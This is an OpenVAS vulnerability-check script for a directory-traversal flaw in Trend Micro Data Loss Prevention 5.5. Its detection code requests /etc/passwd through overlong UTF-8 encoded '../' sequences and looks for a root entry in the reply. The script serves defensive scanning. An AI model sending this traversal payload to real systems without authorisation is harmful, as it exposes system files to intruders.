###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_trend_micro_data_loss_prevention_48225.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Trend Micro Data Loss Prevention Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Trend Micro Data Loss Prevention is prone to a directory-traversal
vulnerability because it fails to sufficiently sanitize user-
supplied input.

A remote attacker could exploit this vulnerability using directory-
traversal strings (such as '../') to gain access to arbitrary files on
the targeted system. This may result in the disclosure of sensitive
information or lead to a complete compromise of the affected computer.

Trend Micro Data Loss Prevention 5.5 is vulnerable; other versions may
also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103182");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-06-14 13:57:36 +0200 (Tue, 14 Jun 2011)");
 script_bugtraq_id(48225);

 script_name("Trend Micro Data Loss Prevention Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/48225");
 script_xref(name : "URL" , value : "http://us.trendmicro.com/us/products/enterprise/data-loss-prevention/index.html");

 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_trend_micro_data_loss_prevention_detect.nasl");
 script_require_ports("Services/www", 8443);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:8443);
if(!get_port_state(port))exit(0);

if( ! dir = get_dir_from_kb(port:port,app:"trend_micro_data_loss_prevention"))exit(0);

url = string(dir,"//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"); 

if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:.*")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
